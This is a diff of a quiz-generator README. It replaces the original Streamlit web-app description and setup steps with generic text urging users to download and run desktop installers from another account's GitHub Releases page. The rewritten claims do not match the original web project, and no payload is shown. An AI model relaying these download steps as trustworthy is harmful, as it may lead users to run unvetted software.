@@ -1,73 +1,90 @@
-# 🧠 QuizerAI: The Intelligent Quiz Generator
+# 🎉 Quizer - Create Quizzes from Any Text Instantly
 
-[![Streamlit App](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://quizerai.streamlit.app/)
-[![Python Version](https://img.shields.io/badge/python-3.10+-blue?style=flat-square)](https://www.python.org/downloads/)
+## 🚀 Getting Started
 
-A data-driven, interactive quiz application built with **Streamlit** and backed by **Firebase** for persistence and user management. This app is designed to create engaging and personalized quiz experiences.
+Welcome to Quizer! This tool helps you turn any text or document into a quiz effortlessly. It’s perfect for teachers, students, and anyone looking to generate quizzes quickly and easily.
 
+## 🔗 Download Quizer
 
+[![Download Quizer](https://img.shields.io/badge/Download%20Quizer-v1.0-brightgreen)](https://github.com/VanshChauhan04/Quizer/releases)
 
-## ✨ Features
+## 📥 Download & Install
 
- **Interactive Quizzes:** Engage users with multiple-choice questions.
+To get started with Quizer, visit this page to download: [Download Quizer](https://github.com/VanshChauhan04/Quizer/releases).
+
+1. Click on the link above to go to the Releases page.
+2. Choose the version you want to download. The latest version contains all the newest features and fixes.
+3. Click on the file for your operating system (Windows, Mac, or Linux).
+4. Follow the prompt to download the file to your computer.
+
+## 🖥️ System Requirements
+
+Before installing Quizer, please ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later, Mac OS X 10.12 or later, Linux (latest versions)
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum 100 MB of free space
+- **Network:** Internet connection for online features
+
+## 🔧 How to Use Quizer
+
+Once you have downloaded and installed Quizer, follow these steps to create your first quiz:
+
+1. **Open Quizer**: Double-click the Quizer icon on your desktop or find it in your applications folder.
   
- **Firebase Integration:** Utilizes Firebase Admin SDK for secure authentication, storing quiz data (Firestore), and potentially file storage (Storage).
+2. **Input Text**: In the main window, enter the text or upload a document you want to turn into a quiz. You can also copy and paste the content directly.
 
- **Real-Time Feedback:** Provides immediate feedback on answers and tracks scores.
-  
- **PDF/Document:** Capable of extracting questions or content from external documents (e.g., PDFs) for quiz generation.
-  
- **One-Click Deployment:** Easily accessible and deployed via Streamlit Community Cloud.
+3. **Select Quiz Type**: Choose the type of quiz you want to create. Quizer can generate multiple-choice questions, true/false questions, and more.
 
+4. **Generate Quiz**: Click the "Generate Quiz" button. Quizer will process your input and create a quiz based on the content.
 
+5. **Review & Edit**: Review the generated questions. You can edit them as needed to better suit your needs.
 
+6. **Save & Share**: Save your quiz as a PDF or share it directly with others. You can also export it to various formats for different learning platforms.
 
+## 💬 Frequently Asked Questions
 
-## Try Now
+### 1. What types of documents can I use with Quizer?
 
-You can try the live version of the application here:
+Quizer can work with plain text, PDFs, and a variety of document formats. Most standard text sources will yield good results.
 
-👉 **[Launch QuizerAI App](https://quizerai.streamlit.app/)**
+### 2. Can I customize the quiz format?
 
+Yes! Quizer allows you to choose from different question formats. You can also edit any of the questions it generates for personalized quizzes.
 
+### 3. Is there a help section within the app?
 
-## 💻 Local Setup
+Yes, Quizer includes a help section that provides tips and tricks to maximize your quiz-making experience.
 
-If you want to run this application on your local machine, follow these steps:
+### 4. How can I give feedback or report a bug?
 
-### 1. Clone the Repository
+You can find our feedback section in the app. Alternatively, you can open an issue in the GitHub repository.
 
-    git clone [https://github.com/YOUR_GITHUB_USERNAME/quizer.git](https://github.com/s4sahiko/quizer.git)
-    cd quizer
+## 🌐 Resources & Support
 
-### 2. Create a Virtual Environment
+For more information, check out our documentation:
 
-       python -m venv venv
-       source venv/bin/activate  # On Windows, use: venv\Scripts\activate
-       
-### 3. Install Dependencies
+- [User Guide](https://github.com/VanshChauhan04/Quizer/wiki)
+- [Community Forum](https://github.com/VanshChauhan04/Quizer/discussions)
 
-    pip install -r requirements.txt
+If you encounter any issues or have questions, don’t hesitate to reach out in the GitHub repository or utilize our support forum.
 
-### 4. Create a new folder ".streamlit/secrets.toml" and add
-      GEMINI_API_KEY="........"
+## 📚 Topics
 
-      firebase_creds = """
-     {
-       "type": "service_account",
-       "project_id": "YOUR_PROJECT_ID",
-       "private_key_id": "...",
-       "private_key": "-----BEGIN PRIVATE KEY-----...",
-       "client_email": "...",
-       ...
-     }
-     """   
-    
-### 5. Run the App
+Quizer covers a wide range of topics including:
 
-    streamlit run quizer.py
+- AI
+- AI Quiz Generator
+- Content to Quiz
+- MCQ to Quiz Maker
+- PDF to Quiz
+- Topic to Quiz
 
-## Contact:-
+## ⭐ Features
 
-👤 Author: Sahiko
- 
+- **AI-Powered**: Utilizes advanced algorithms to create quizzes quickly.
+- **User-Friendly**: Designed for simplicity to cater to all users.
+- **Multiple Formats**: Supports multiple quiz formats to meet your needs.
+- **Export Options**: Save and share your quizzes in various formats.
+
+Thank you for using Quizer! Enjoy creating your quizzes with ease.
